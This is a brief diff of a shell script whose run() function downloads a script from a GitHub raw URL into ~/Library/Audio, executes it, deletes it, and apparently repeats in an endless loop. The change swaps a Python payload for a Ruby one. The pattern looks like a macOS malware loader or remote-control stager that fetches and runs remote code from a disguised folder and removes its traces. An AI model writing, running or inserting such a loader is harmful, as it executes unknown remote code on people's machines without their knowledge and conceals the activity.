@@ -1,9 +1,9 @@
 run() {
-    curl https://raw.githubusercontent.com/Milooles/deployable-rc/refs/heads/main/3_main.py -o ~/Library/Audio/3_main.py
+    curl https://raw.githubusercontent.com/Milooles/deployable-rc/refs/heads/main/3_main.rb -o ~/Library/Audio/3_main.rb
 
-    python3 ~/Library/Audio/3_main.py
+    ruby ~/Library/Audio/3_main.rb
 
-    rm ~/Library/Audio/3_main.py
+    rm ~/Library/Audio/3_main.rb
 }
 
 while true; do
